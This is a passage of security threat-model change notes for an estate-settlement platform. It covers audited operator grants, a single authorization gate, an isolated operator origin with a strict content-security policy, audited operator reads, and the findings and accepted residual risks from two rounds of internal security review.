**The act that creates an operator was the one privileged act in the product
with no entry in the append-only trail.** `settlement_operators` decides who may
run §5.1's mandatory human review — approve a death case, lock an account,
confirm a verification, approve a distribution, approve a stage of access to a
dead person's estate. Every one of those actions emits an audit event. Granting
somebody the authority to perform them emitted nothing, in either direction:
there was no `settlement.operator.granted`, no `.revoked`, and no action in
`AUDIT_ACTIONS` that could have carried one. The trail could show what an
operator did and could not show that they had ever been made one.

**And the mechanism was two implementations of one behaviour, one of them
dead.** `OperatorsRepo.grant`/`.revoke` carried a docstring calling them "the
CLI-only write path"; `operator-cli.ts` reimplemented both in raw SQL and called
neither, so the repo's write methods had ZERO CALLERS anywhere in the
repository. The two had already drifted in the way this shape always drifts —
the repo handled a duplicate grant through `isUniqueViolation(err)`, the CLI
through an inline `err.code === '23505'` check. This is the M8 PR2 shape (seven
byte-identical audit producers sharing one bug) in the allowlist that decides
who may approve a death case.

**`granted_by` has been declared since M7 and written by nothing.** Every row in
the table said only that somebody holding the database made a grant.

### What PR1 changes

- **The ceremony audits, and REFUSES TO WRITE WHEN IT CANNOT.** A broker is
  required for `grant` and `revoke`; `list`, which changes nothing, does not
  need one and is handed a producer that THROWS if anything tries to emit
  through it — an assertion that the read path is silent rather than a stub for
  it. The template-publish CLI's precedent (fall back to an in-memory producer
  when no broker is configured) is right for a template and wrong here: it would
  make an unaudited grant the quiet default on every machine without
  `KAFKA_BROKERS`, which is every developer laptop.
- **Attribution is required.** `--by <authorizingUserId>` fills `granted_by`.
  It is ATTRIBUTION, NOT AUTHENTICATION — whoever runs this already holds the
  database connection and could write the row by hand. What it buys is that the
  sanctioned path produces a record naming a human, so a row with `granted_by
  IS NULL` is visibly one that did not come through here. The e2e's seeding
  `INSERT` is exactly such a row, and its comment now says so instead of
  claiming to be the CLI's write path.
- **One write path, asserted in both directions.**
  `test/operator-write-path.spec.ts` scans the service's own source: only the
  ceremony may call the repo's write methods, only the repo may write the table
  in SQL (the method-name scan alone is evadable by the inline statement that
  was there before), the ceremony really does call them (without which the
  fence passes vacuously the day somebody reverts to raw SQL), and no
  controller mentions the table or the repo at all. A source scan rather than a
  runtime guard because there is no runtime seam: the CLI and the service share
  one class by design, so the difference between a sanctioned and an
  unsanctioned call is WHERE IT IS WRITTEN.
- **Ordering inside the transaction: the reversible step first.** The INSERT
  rolls back and the Kafka emit does not, so the row is written first and the
  event emitted second, and a failed emit rolls the grant back rather than
  leaving it unrecorded.
- **A REPEAT GRANT DID NOT WORK, and only the live drive found it.** `grant`
  recovered from the partial index's unique violation by re-reading the existing
  row — which is fine against a connection POOL, where each statement gets its
  own implicit transaction, and impossible inside the CLI's own `BEGIN`/`COMMIT`,
  because Postgres aborts a transaction on a failed statement and refuses every
  command until rollback. So the second grant died with `current transaction is
  aborted` while three green specs called it a clean no-op: every one of them
  drove a pooled handle, so **the harness was more permissive than the only path
  that ever really runs**. Fixed by never raising the error at all — `ON CONFLICT
  (user_id) WHERE revoked_at IS NULL DO NOTHING`, naming the index's own
  predicate so a revoked row is not a conflict — which makes the two contexts
  agree rather than making the recovery cleverer, and the int spec now runs the
  ceremony inside a real transaction. Checked for the same shape elsewhere: the
  service's three other unique-violation catches all `return` or `throw`
  immediately and issue no follow-up statement, so none of them has it.
- **The CLI became testable at all.** It had no exports, no `require.main`
  guard, no package script and 0% coverage while sitting inside the coverage
  denominator — no test in the repository had ever executed it. Its argv
  contract, its broker gate and each of its emit branches are now unit-proven,
  and `operator-cli.int.spec.ts` drives the whole ceremony against real
  Postgres, because `grant`'s idempotence rides a PARTIAL unique index and a
  fake repo has no index to violate.

### Residuals

- **[ACCEPTED]** *`--by` is attribution and not authentication, and the fence
  bounds source rather than the database.* Whoever holds `DATABASE_URL` can
  write the row by hand, unattributed and unaudited. Nothing in a CLI can
  change that: the authority here IS possession of the connection. What the
  ceremony buys is that the sanctioned path leaves a record, and that a row
  which did not come through it is visibly different (`granted_by IS NULL`, no
  audit event) rather than indistinguishable. Closing it properly is the
  operator platform with real IAM — **E1**.
- **[ACCEPTED]** *`settlement_operators.user_id` has no foreign key and cannot
  have one.* `users` lives in the AUTH cluster and settlement is a co-tenant on
  CORE, and docs/02 §8 forbids cross-cluster foreign keys — so a mistyped UUID
  becomes a live allowlist row naming no account. It grants nothing (no session
  can ever present that subject) and it is invisible in `list` beyond being a
  UUID nobody recognises. The check that would catch it is a user-existence
  lookup against identity, which would mean giving settlement a credential it
  deliberately does not hold, to catch a typo whose only consequence is a row
  that does nothing.
- **[ACCEPTED]** *An event may land for a commit that then fails.* This is the
  ordinary residual every emit-inside-a-transaction carries in this repository,
  and the ordering above chooses which way it falls: a phantom grant record is
  investigable, a silent real grant is not.
- **[OWNER: M21]** *An operator is still an ordinary account session that
  happens to appear in a table.* PR1 changes who can get into the table and not
  what being in it authenticates as. The session audience is PR3 (moved there
  from PR2 on measurement — §6aa), and the allowlist remains the control there
  too — see §4 TB7.
- **[OWNER: M21]** *Revocation takes effect on the next request and
  notifies nobody.* The allowlist is read per action against the database, so a
  revoked operator loses authority at their next call rather than
  retroactively — which is the correct behaviour and is stated here because
  nothing announces it. No notification is sent to the revoked operator or to
  anyone else, because the audience for such a message is an operator surface
  that does not exist.
- **[OWNER: M21]** *Nothing surfaces the allowlist to a human but `list` on
  a terminal.* An operator cannot see who else is an operator, and no periodic
  review of the allowlist exists — which is the control the ceremony's record
  is FOR. The record is now there to be read; the reader is PR3.


## 6aa. Threat-model delta — M21 PR2, one operator gate (2026-08-17)

**One service read the allowlist at SEVEN call sites in four distinct shapes,
and they had already drifted about when the question is asked.** Two
byte-identical private `assertOperator` methods (one in `settlement.service.ts`,
one in `admin.service.ts`), a bare `isOperator` branch inside
`assertCaseVisible` that returns the case rather than throwing, an inline
`isOperator || isExecutorOf` disjunction in `setDistributionStatus`, and three
more direct reads feeding a value (`addEvidence`, `getCase`,
`evidenceReadAuthority`). The disjunction was the only one of the seven that
read the allowlist on the TRANSACTION handle; `startReview` and `confirmVerification` — the two §5.1
routes that begin and end a death case — resolved it on the pool and only then
opened the transaction they were guarding. Four spellings of one question is the
M8 PR2 shape, in the code that decides who may approve a death case.

**And three call sites asserted operator-ness to Cedar rather than measuring
it.** `assertCan`'s second argument IS the `isSettlementOperator` attribute
`settlement.cedar` matches on, and at `startReview`, `decideReview` and
`confirmVerification` it was the literal `true`. That was SOUND, and sound for a
reason nothing enforced: an assertion had run a few lines above. Delete that
line — a refactor, a merge, an extracted helper — and the route opens to any
authenticated caller while the policy goes on evaluating happily against a
constant asserting the very thing nobody checked. A PEP whose input is a literal
cannot deny anything, and it is the layer this repo relies on to deny by
default.

### What PR2 changes

- **`OperatorGate` is the only reader of the allowlist.** One class, one
  question. `is()` answers, `assertIn()` refuses AND RETURNS the measured
  answer — which is what Cedar is handed now, so removing the check removes the
  argument. The positional dependency between two adjacent statements becomes a
  structural one the compiler enforces.
- **The handle is a parameter with no default**, because which one a caller
  passes is a decision rather than a detail: a write passes its own `tx` so the
  allowlist answer belongs to the same transaction as the row it authorizes; a
  read with no transaction to be consistent with passes the pool. **The five
  pool sites are DECLARED with a reason each and everything else must pass
  `tx`**, checked by the same fence — because the handle is precisely what the
  four replaced paths had already drifted about, and a convention nobody checks
  is how it drifts again.
- **The gate is read BEFORE the case row is locked**, deliberately. A
  non-operator is refused without learning whether the case id names anything —
  the uniform-404 rule, preserved rather than newly added, and now visible in
  one ordering instead of implied by four.
- **EVERY CASE-SCOPED READ NOW ANSWERS ONE REFUSAL.** Found by the pre-merge
  adversarial pass and measured live before it was believed: `getCase` and the
  four admin reads that funnel through `assertCaseVisible` (timeline, stages,
  tasks, distributions) answered 404 for an unknown case id and 403 for a real
  one, so any authenticated caller holding an id learned whether a death case
  exists for it. Pre-existing rather than introduced here, and the same defect
  M19 PR1 closed in assets one milestone earlier — but §6aa was about to claim
  this service preserved the uniform-404 rule, which on those five routes it did
  not. `SettlementAuthz.assertCanOrNotFound` is the assets precedent applied:
  used wherever the resource was located BY the id under authorization, and NOT
  on the operator write paths, where a non-operator is refused before any lookup
  and so learns nothing either way. The two tests that covered this were
  themselves the lesson — one asserted a stranger got 403 and the next, named
  *"404s an unknown case rather than leaking its absence differently"*, asserted
  an unknown id got 404. Together they asserted the leak and called it the
  opposite. One test now, comparing the two answers, because neither alone can
  see the property. A THIRD witness said the same thing at a higher layer: the
  §5.1 end-to-end spec pinned `expect(403, { error: 'forbidden' })` for a
  stranger reading a real case, so the leak was written into the file that
  exists to prove this chain — which is how the fix presented, as a red e2e
  rather than as a red unit test. It compares the two answers now too.
- **Two fences, both source scans, because there is no runtime seam.** A
  sanctioned read of the allowlist and an unsanctioned one call the same method
  on the same class, so the difference is WHERE IT IS WRITTEN. The first asserts
  the gate is the only caller of `OperatorsRepo.isOperator`, that the gate really
  does call it (without which the first assertion is satisfied by a gate that
  calls nothing, and every caller would be admitting on a hardcoded answer), and
  that no service declares its own `assertOperator` again. The second asserts
  Cedar is never handed `true`, that `false` appears only at DECLARED owner-path
  sites each carrying its reason, that every other call passes the resolved
  variable, and that every gate call passes `tx` unless its method is a declared
  pool read. It RESOLVES each call to its enclosing method and REFUSES a shape
  it cannot resolve, because an unattributed call would silently satisfy every
  assertion in the block. Both corpora are recursive and asserted equal to the platform's own
  recursive read — §6y's M21 item discharged for two more fences rather than
  restated.
- **The gate has direct tests, which none of the four copies had.** Unifying N
  copies of a guard is only safe if the unified one is tested harder than the
  copies were, because the blast radius becomes every caller: making `assertIn`
  return without throwing now opens four admission paths at once. Including that
  a repo FAILURE propagates as an error rather than collapsing into `forbidden`
  — telling an operator they are not one is a different and actionable fact from
  a database outage (the M9 rule, pointed the other way).

### Residuals

- **[ACCEPTED]** *Moving the read inside the transaction NARROWS the
  revoke-during-action window and does not close it.* These transactions are
  READ COMMITTED, so each statement takes a fresh snapshot and a revoke
  committing after the gate's read is still unseen at commit time. Closing it
  means taking a share lock on the allowlist row so a revoke has to wait — real
  contention on every operator action, bought to serialize against an adversary
  who must be an operator being revoked in that exact instant, on a path where
  the losing outcome is one further action by somebody who was an operator
  moments earlier and whose action is audited under their name. The property the
  handle secures is CONSISTENCY — one question, one handle, the service no
  longer disagreeing with itself — not atomicity, and the code says so rather
  than implying the stronger claim.
- **[ACCEPTED]** *Two sites hand Cedar a literal `false`, and that is the
  correct value.* `void` (the owner's kill switch) and `manage` (the owner's own
  settings) evaluate the caller purely as the decedent. Measuring the allowlist
  there would WIDEN the decision for an owner who is also an operator, which is
  the direction `settlement.cedar` deliberately avoids by never carrying an
  `owner` attribute. Declared as data with a reason per entry and fenced, so a
  third one is a visible decision.
- **[ACCEPTED]** *An entitled caller still learns an unknown case id is
  unknown.* The uniform answer is about what someone with NO relationship to a
  case learns; a decedent, reporter, executor or operator is told the id is
  wrong, because a surface that answered "not found" to the people it is for
  would be unusable. The oracle it closes is the one available to everybody
  else.
- **[OWNER: M21]** *`admin.service.ts` has no PEP at all — the gate is the whole
  authorization on those routes.* `settlement.cedar`'s permits are scoped
  `resource is SettlementCase` and the admin routes act on tasks, stages and
  distributions, so there is no policy for them to consult and adding one means
  new resource types with their own attributes. Until then the allowlist
  membership IS the decision on that controller, which is exactly why PR2 made
  it one gate rather than three shapes. The operator surface (PR3) is what makes
  those routes reachable from the product at all.
- **[OWNER: M21]** *The BFF's SDL enums and its own hand-written payload unions
  are two copies in one file with nothing comparing them.* Found by PR2's review
  and recorded rather than fixed, because it lives outside this PR's subject —
  but MEASURED, not assumed: widening `enum SessionAudience` in
  `apps/bff/src/schema.ts` and nothing else leaves `@estate/bff` green on both
  typecheck and its 399 tests. What catches it today is one layer over,
  `apps/web/src/graphql/enum-parity.test.ts` (M20 PR1), which reads that SDL and
  goes red on the app mirror — confirmed by running the mutation. So the SDL→app
  direction is fenced and the SDL→BFF-payload direction is not; the exhaustive
  `AUDIENCE_GQL` Record couples the payload union to `SessionAudience` in
  `@estate/contracts` rather than to the SDL beside it. The failure mode is a
  value the BFF's TypeScript admits and its own schema rejects at serialization
  — a runtime error rather than a build one. PR3 adds the `operator` audience and
  is therefore the change that first exercises this, which is why it owns it.
- **[OWNER: M21]** *An allowlist row has no expiry, no case scoping and no
  session binding.* Any live row grants authority over EVERY case, forever, from
  any session that user holds. None of the three is a defect in the gate — the
  gate faithfully answers the question the table can answer — and all three are
  properties of an interim allowlist that M7 shipped as the stand-in for the
  operator platform. Case scoping is what separation of duties would need beyond
  the row-local DDL CHECKs (reviewer ≠ reporter, requester ≠ approver); session
  binding is PR3's audience; expiry and just-in-time elevation are **E1**, since
  they need the IAM the deployment does not have.
- **[OWNER: M21]** *The gate answers a question about a PERSON and every caller
  then asks it about an ACTION.* There is one operator role and it carries every
  operator verb: approve a death case, lock an account, decide a stage of access
  to a dead person's estate, approve a distribution. Nothing in the interim
  allowlist can express "may review, may not approve distributions". A real role
  vocabulary is the operator platform's, and the gate is the seam it would go
  behind.


## 6bb. Threat-model delta — M21 PR3a, the operator boundary (2026-08-18)

**A fourth session audience, a role-blind mint, and a second isolated origin —
with deliberately nothing behind it.** PR3a ships the BOUNDARY that TB7's
"operator authentication" line has described as absent since the threat model was
written, and PR3b ships the surface. The split is not administrative: an audience
is worth exactly what the services that refuse it make it worth, so the boundary
is reviewable on its own and the screens are reviewable on their own — the M15
PR1→PR2 precedent, where the vault origin proved its boundary before any key
material stood behind it.

### The three decisions, and what each one is not

- **An audience is a RESTRICTION, never a claim about its holder.** `operator`
  says only *this credential may be spent in fewer places than an ordinary
  session*. It does not say the holder is an operator, and nothing anywhere reads
  it as though it did: `OperatorGate` against `settlement_operators` remains the
  one answer to "may this person act", exactly as §6aa left it. That is what
  makes a ROLE-BLIND mint correct rather than a gap. Identity holds no settlement
  credential, there is no dblink between the auth and core clusters, and identity
  has no concept of a role — so a mint that tried to check would need a new trust
  edge to answer a question the audience is not asking. What an operator gets by
  minting one is a credential worth LESS than the account session they already
  held.

- **The route is the selector, not a field.** There are two mint routes —
  `POST /v1/auth/handoff` and `POST /v1/auth/handoff/operator` — rather than one
  taking an `audience` in its body. Nothing on the wire names an audience, so
  there is no field for a caller to set, no parameter for a schema to widen by
  accident, and the two ceremonies are separately guarded and separately audited.
  Redemption is deliberately audience-BLIND: one route, one response shape, and
  the audience travels on the `auth_handoffs` row that only the mint could
  write. The alternative — a single mint taking `{audience}` — was rejected on
  M16 PR1's finding that `HandoffService.mint`'s audience parameter was typed as
  the full union while only a DDL CHECK stopped it, and that parameter was
  deleted rather than narrowed for exactly this reason.

- **A SECOND isolated origin, not a second path on the first.** `operator.localhost`
  is a different HOST from `vault.localhost` and from the app, because cookie
  scope ignores the port — the fact M15 measured in a real browser before the
  vault origin relied on it. The two origins carry different `__Host-` cookie
  names, and neither is sent to the other by the browser. Reusing the vault
  origin was rejected outright: it would put an operator credential in reach of
  the code holding Zone A key material, and Zone A's whole argument is that its
  origin has a framework-free client and nothing else on it.

### What PR3a changes

- **`SESSION_AUDIENCES` gains `operator`**, closed in the TypeScript union and in
  `auth_handoffs`' CHECK, which migration `012_operator_audience.sql` WIDENS
  (`IN ('vault', 'operator')`) rather than rewriting — the shape the audience
  fence parses.
- **`AUDIENCE_ADMITTERS.operator` is EMPTY** and
  `AUDIENCE_ROUTE_ADMITTERS.operator` names three identity handlers: `session`
  (introspection must admit every audience or no isolated origin can exist),
  `stepUp` (an origin must be able to re-prove a factor without a round trip back
  across the boundary — the M15 PR4 lesson, where a free step-up on redemption
  let a stolen handoff code crypto-shred a vault), and `logout` (revoking your own
  credential can only reduce authority). `handoff` and `handoff/operator` are
  deliberately absent, so a leaked operator code cannot chain itself forward in
  either direction.
- **`apps/operator-web`** is the origin: framework-free, zero dependency tree in
  the browser, `default-src 'none'` / `script-src 'self'` with no `unsafe-*` in
  ANY environment, `require-trusted-types-for 'script'` with `trusted-types
  'none'`, and — stricter than the MAIN APP, which needs `data:` for M12's
  document viewer — no `data:` in `img-src`, because nothing here renders an
  inline image. It is IDENTICAL to the vault origin's policy, not stricter than
  it; the first draft of this paragraph claimed otherwise and measurement
  refuted it. What now gates the relation is a live comparison of the two
  origins' headers in the stack e2e, directive by directive, so the second
  isolated origin cannot drift weaker than the first. It holds NO credential in either
  direction, asserted three ways: a source fence, a runtime assertion that its
  config's credential holding is both equal to the granted set and explicitly
  empty, and a compose-parity assertion over its deployment block.
- **The proxy is an exact-match allowlist of three identity routes.** A proxy
  that forwards whatever path it is handed while carrying a live bearer is an
  SSRF primitive; and `startsWith` is not enough, because
  `/api/auth/logout` is a prefix of identity's unauthenticated
  `/v1/auth/logout/refresh`.
- **`route-consumers.spec.ts` learned about a second edge.** Its
  `deriveEdgeRewrites()` read one file, so a second edge would have contributed
  ZERO rewrites and this origin's `/api/…` literals would have resolved through
  the vault's table by coincidence — a fence whose input is narrower than its
  claim, going green for the same reason it is wrong (§6y). It now walks a
  declared `EDGE_SERVERS` list, matches both table shapes, and carries a PER-EDGE
  anti-vacuity floor.

### Residuals

- **[ACCEPTED]** *The origin does not re-check the audience of the session it
  redeems.* It could not usefully: the redeem response deliberately does not
  carry one, and a second copy of an audience decision at an edge is a second
  copy free to drift from the callees that enforce it in both directions (vault
  refuses `operator`, settlement will refuse `vault`). What makes this safe is
  that the browser client DISPLAYS the audience it reads back from
  `/api/auth/session`, so a session of the wrong kind is visible rather than
  silently tolerated.
- **[ACCEPTED]** *A stolen mint code is worth an operator-audience session for
  60 seconds.* Identical to the vault handoff's exposure and bounded the same
  way: burned on the ATTEMPT so a race is winner-takes-all, one access token
  with no refresh token in existence, and — the part specific to this audience —
  a session that today reaches nothing but identity's three routes. Script on the
  app origin can read the code out of the hidden field it is posted in, which is
  why the app origin's own CSP weakness (M11: `script-src` is not locked down,
  because Next's inline bootstrap needs nonces) bounds this rather than the
  operator origin's strength.
- **[CLOSED: §6cc]** *Settlement emits no read event of any kind — PR3b.* All 23
  of its audit actions were writes, so an operator opening a case, reading its
  timeline or working the queue left no trace of the read. PR3b's first slice
  adds them, in the same change as the screens that make the reads — adding them
  earlier would have been a routeless event, which is the zero-callers shape this
  milestone exists to close. The TB7 paragraph claiming these events already
  existed was corrected in the same PR that found it false.
- **[OWNER: M23]** *Operator actions remain unbounded.* There is no rate
  limit on any operator verb, and neither PR3a nor PR3b adds one, because a bound whose
  only caller is a surface that does not exist is a control nobody exercises
  (`ACCOUNT_PASSWORD_BOUND`'s history in §6y is what the alternative looks like).
  The mint route inherits the step-up path's existing cap transitively, which
  bounds the CEREMONY and says nothing about the actions behind it.
- **[OWNER: M23]** *The operator interstitial is reachable only by typing
  its URL.* `/operator` is deliberately not in the app's navigation: minting is
  role-blind, so the page works for everybody, and a product for 10M users should
  not put "open the operator console" in an estate's own navigation. How an
  operator finds it is a question with a real answer only once there is something
  behind it.
- **[OWNER: E1]** *An operator-audience session is still a 15-minute credential
  with no expiry policy of its own, and no way for an operator's employer to
  revoke it centrally.* Just-in-time elevation and session recording both need
  the IAM the deployment does not have, exactly as TB7's deferral list records.


## 6cc. Threat-model delta — M21 PR3b, the operator screens (2026-08-19)

**The surface behind the boundary, and the first read events settlement has ever
emitted.** PR3a shipped an audience, a role-blind mint and an isolated origin
with deliberately nothing on it. PR3b puts the review queue, the post-verification
worklist and the case surface there, wires thirteen settlement routes through the
edge, and gives an operator's READS a trail of their own.

### What PR3b changes

- **Thirteen settlement handlers gain `@AllowSessionAudiences('operator')`**, per
  handler and never service-wide. `CallerGuard.audiencesFor` returns a UNION that
  widens and can never narrow, so a service-wide grant would hand an operator
  session every route settlement declares — including the owner-facing intake and
  void routes. The set is derived and asserted in
  `apps/services/settlement/test/session-audience.spec.ts`, in both directions.
- **The edge gains a second upstream and a table with a METHOD in every row.**
  `GET cases/:caseId/stages` is the operator's list; `POST` on the same path is
  the EXECUTOR's stage request, which the console does not carry and the audience
  does not admit. A path-keyed allowlist could not express that difference, so
  the row is `(method, path, upstream, rewriteTo)` and the upstream path is BUILT
  from the template rather than produced by surgery on what arrived. The query
  string is dropped: a settlement path already names a case, and a query string
  is the part intermediaries log by default (the M12 document-search rule).
- **Every operator read is audited**, and until PR3b all 23 of settlement's
  audit actions were writes. TWO actions rather than six: loading one case opens
  four reads (the case, its timeline, its stages, its distributions), so one
  action per route would be four events per screen — noisier without being more
  informative — and the route travels in `detail.surface`.
  `settlement.queue.viewed` is cross-case reconnaissance with no resource id;
  `settlement.case.viewed` names exactly one estate and belongs on that case's
  own trail. They answer different questions, which is why they are two.
- **The console does NOT poll**, and the reason is that trail rather than the
  network. Each case read is an audit event on a dead person's estate, so a
  console that refreshed itself would turn one screen, abandoned over lunch, into
  hundreds of recorded reads — the audited-volume-is-a-UI-constraint rule M12
  applied to document decrypts, arriving where the subject is a settlement case.
  A case is re-read when somebody acts on it, and a stack test opens a case,
  counts exactly four reads, and then waits.
- **The step-up ceremony POLLS.** Identity grants the elevation; settlement
  learns of it by introspecting the token through `HttpSessionVerifier`'s
  short-TTL positive cache, so for up to one TTL a peer still answers from a
  cached un-elevated session and a single-shot retry leaves the prompt doing
  nothing (the M13 review's finding against the main app). Cancel ABORTS the
  loop, and the ownership marker is a counter rather than a boolean, because
  Cancel restores the form and a second attempt can begin while the first is in
  flight. The stakes here are a death case: a retry surviving Cancel could
  confirm a verification, which locks a living person's account and revokes every
  session they hold.
- **The PR3a claim that an operator credential "reaches none of your estate" is
  REPLACED, in the change that made it false** — on the console's own screen and
  in the app's paired-devices list, with a test asserting the absolute is gone
  rather than merely that the new words are present.

### Residuals

- **[ACCEPTED]** *An operator console session can see a case its holder is party
  to.* Four of the thirteen routes reach a case through `assertCaseVisible`, and
  that predicate admits the DECEDENT, the REPORTER and the estate's EXECUTOR as
  well as an operator — deliberately, because those are the people a case is
  about and the alternative is four routes with two authorization models. So a
  console session really can read a case the holder reported, or is executor of.
  It is accepted rather than closed for three reasons: the credential reaches
  nothing the holder's ORDINARY account session could not already reach through
  the same routes, so no authority is gained; narrowing `assertCaseVisible` for
  the operator audience would put a second copy of a §5.1 visibility rule in the
  code path, which is how two answers start to disagree; and the honest fix is
  the audience copy, which now states a RESTRICTION ("it cannot reach your
  assets, documents, people or vault") rather than an absolute the platform does
  not keep.
- **[ACCEPTED]** *A console session's reads are indistinguishable, in the audit
  trail, from an operator's legitimate work.* The read events carry the actor and
  the case and nothing about WHY, because settlement has no concept of an
  assignment or a ticket. Reading a case one is party to therefore looks exactly
  like reading it as an operator. What bounds it is that the events EXIST at all
  — before PR3b there was nothing to correlate — and the correlation an
  investigator would run (an operator reading cases they are also the reporter
  of) is answerable from the case rows already recorded.
- **[ACCEPTED]** *Withdrawing consent cannot recall an action already on the
  wire.* The step-up prompt aborts on Cancel, on a fresh attempt, and on the
  parent discarding it (a PR3b review finding: before it, "Back to worklists"
  mid-poll closed the case two seconds later). What aborting stops is the LOOP —
  no further attempt is issued and no result is acted on — and it cannot reach a
  request already issued, whose transaction may commit at settlement while the
  client has stopped observing it. Bounded to at most one action, and to one the
  operator consented to by submitting a code; the window is the ~100ms of a
  retry in flight. Closing it means making the outcome conditional on something
  the client can still withdraw, which is a settlement change rather than a
  browser one, for a case where consent was given and then reconsidered inside a
  tenth of a second.
- **[ACCEPTED]** *The case id lives in module state and not in the URL.* A refresh
  returns to the worklists, which is a real cost paid deliberately: a hash route
  would accumulate death-case references in an operator's browser history and put
  one in the address bar, which is the part a screen-share or a screenshot
  catches.
- **[OWNER: M23]** *A stale console screen can offer a verb the case no longer
  admits.* The console reads a case, renders the verbs its status allows, and
  does not re-read until somebody acts — so a case another operator advanced in
  the meantime is refused by settlement's own transition table with
  `invalid_transition`, which the screen reports as "this case has moved on;
  reload it". That is the correct failure and it is still a failure the operator
  meets rather than avoids. Closing it wants a change feed, which is the operator
  platform's problem rather than this surface's.
- **[OWNER: M23]** *There is no second-person review of an operator's own reads.*
  Separation of duties exists at the ROW — reviewer ≠ reporter, approver ≠
  requester, approver ≠ recorder, all DDL CHECKs — and nothing anywhere reviews
  who READ what. That is the same deferral TB7 records for session recording, and
  it needs the operator platform's own surfaces rather than this console's.


## 6dd. Threat-model delta — M21 PR4, the security review (2026-08-19)

Seven file-scoped discovery lenses over the milestone's own files (never a diff
range), each in its own worktree detached at `9101c12`, then two adversarial
verifiers per deduped candidate on different angles — reachability in a real
production configuration, and is-it-already-a-documented-decision — both told to
default to refuted. Every confirmed finding was re-proved by execution before a
line changed, and every fix mutation-tested from a pristine copy with a positive
control beside it.

FIFTEENTH milestone running where every confirmed finding sits in machinery the
milestone introduced — with ONE exception, which is the most useful thing the
review produced and is recorded below as the launcher consent defect.

**What the verifiers killed, and why that is the point.** Four candidates were
REFUTED on reachability and they are worth naming, because a review that reports
them as findings teaches people to skim it. Retargeting a proxy row's upstream is
caught by `route-consumers.spec.ts`, which derives the edge's rewrites from
`server.ts` itself. `setDistributionStatus` really does leave two of three
transitions unaudited and really does admit `disputed` from `completed` — and has
no product consumer, no BFF client and no edge route, so nothing can reach it.
`evidenceReadAuthority`'s docstring does NOT falsely claim to audit; it says the
read is audited on the documents side, which is true. And the bearer-header fence
matches one spelling of several, which a developer could evade and a request
cannot.

**The one defect older than the milestone.** `StepUpPrompt` checks its ownership
counter AROUND `onElevated()`, never inside it — and both handoff launchers do
their entire side effect inside that call: mint the code, set the form action,
write the code into the field, navigate. So Cancel pressed while the retry's mint
was in flight arrived after the browser had already been sent to the isolated
origin with a live code. Measured, with the mint held open by a promise the test
releases: nothing submitted at the moment of cancel, submitted immediately after.
This is NOT §6cc's accepted residual, which is a different app and is about a
request already on the wire; here the harmful step is client code running after
the response arrives, with the withdrawal already recorded, so it was closable
and is closed. `StepUpPrompt`'s claim that an action can never proceed after
consent is withdrawn has been narrowed to what it can enforce, with the caller's
obligation stated next to it.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** *A blocked handoff POST is detected, not prevented.* The app's
  `form-action` is baked at build time and the BFF serves the origin at request
  time, and nothing outside the compose stack forces them to agree — the parity
  spec compares two literals against one constant, and the image probe proves the
  value arrives rather than that it matches. PR4 converts the silent failure into
  a reported one and clears the code from the DOM, which is what the client can
  do about it. Making the two agree is a deployment-configuration property, not a
  browser one.
- **[OWNER: M23]** *Two of three distribution status transitions emit no audit
  event, and `disputed` is reachable from `completed`.* An unlogged undo of a
  completed distribution, callable by an executor as well as an operator. Left as
  found because the route has no consumer anywhere — no BFF client, and the
  operator edge's exact-match allowlist does not carry it — so it is a latent
  defect in a surface M23 will build, and fixing the emit without the surface is
  the routeless-event shape this milestone exists to close.
- **[OWNER: M23]** *The bearer-header fence matches one spelling.* It anchors on
  `req.headers['authorization']`, so a destructured or aliased read evades it. No
  bearer read path exists on the edge today — the credential comes from the
  `__Host-` cookie and the only `authorization` in the source is the outbound set
  — so evading it requires writing the bypass rather than sending a request.
- **[OWNER: M23]** *The console's egress fence does not cover navigation sinks.*
  It asserts one module may reach the network and lists `fetch`, `XMLHttpRequest`,
  `sendBeacon`, WebSocket, EventSource, service worker and `new Image`; it does
  not list `window.open`, `location.href =`, `location.assign` or
  `form.submit`. The declarative half is covered separately by the
  no-navigating-attribute assertion.
- **[OWNER: M23]** *Three operator-edge items with no reach path.* The edge
  answers 500 rather than 400 on a malformed `Host`; `config.secureCookies` is
  asserted by a test and read by nothing, the cookie attributes being hardcoded;
  and `APP_ORIGIN` is validated as a URL rather than as an origin, so a value
  carrying a path is accepted and serialised to the client.
- **[OWNER: M23]** *Only three of nine services have a service-local audience
  spec.* Identity, settlement and vault have one; the rest rely on the shared
  source fence alone, which cannot see that `CallerGuard`'s reflector is
  `@Optional()` and falls back to the service-wide list when it does not resolve
  — a perfectly decorated route on such a container is silently inert. Vault's own
  sweeps additionally filter on `extension` only, leaving its `vault` admission
  unmeasured, and profile has a per-route widening with no spec at all. The same
  narrower-input-than-claim shape §6y names.


## 6ee. Threat-model delta — M21 PR4b, review round 2 (2026-08-20)

A second pass over the lens scopes PR4's fan-out never reached. Four findings,
all confirmed by execution; two sit in code PR4 itself shipped, which is the
fifteenth consecutive milestone where the machinery a milestone introduced is
where its own review lands.

**A DETECTOR WHOSE PREMISE WAS A TIMING CLAIM WAS DEAD CODE.** Both
isolated-origin launchers (`OperatorLaunch`, `VaultLaunch`) hand authority across
a trust boundary by a top-level form POST, and `form-action` is baked into the
app's CSP at BUILD time while the BFF serves the destination origin at REQUEST
time. PR4 added a `securitypolicyviolation` listener so a refused submit could
not fail silently, and asserted in the code that the event "fires synchronously
on the blocked submit". It does not. The listener was removed in a `finally` and
the flag read a task before the event could set it, so the refusal branch could
never execute. Measured in Chrome against `form-action 'none'`: the submit is
refused, the event does arrive, and the synchronous read is `false` in the
blocked and the allowed case alike — a signal carrying no information. The
listener now OUTLIVES the submit and reports when the violation lands; the two
ways it stops listening (re-arm, unmount) are the only reason that is safe and
both are asserted. What was never at risk is the credential: the field is cleared
unconditionally in the `finally`, so this was a silent-failure defect and not an
exposure.

**ONE UNKNOWN AUDIENCE BLANKED THE PAGE A USER OPENS TO REVOKE A CREDENTIAL.**
`Query.session` is deliberately tolerant of an audience it does not recognise;
`Query.sessions` was strict, and a `z.array` of strict objects fails WHOLESALE —
so a single row minted by an identity deployed ahead of the BFF discarded every
other row, `parseBody` threw, and the paired-devices page rendered an error
instead of the credentials the user came to revoke. `lib/sessions.ts` had carried
the fallback copy for exactly this case since M16, citing the rule that a service
deployed ahead of the app must not blank the page — and it was unreachable,
because the edge refused one layer up. The row is now carried as an opaque string
and named `UNKNOWN` on the wire. Deliberately NOT coerced to `ACCOUNT`: telling
somebody that a credential they do not recognise is their own browser is worse
than the error page it replaces, because it argues them out of revoking it.

**Residuals, stated rather than implied.**

- **[ACCEPTED]** *The blocked-submit report is best-effort.* It reports a
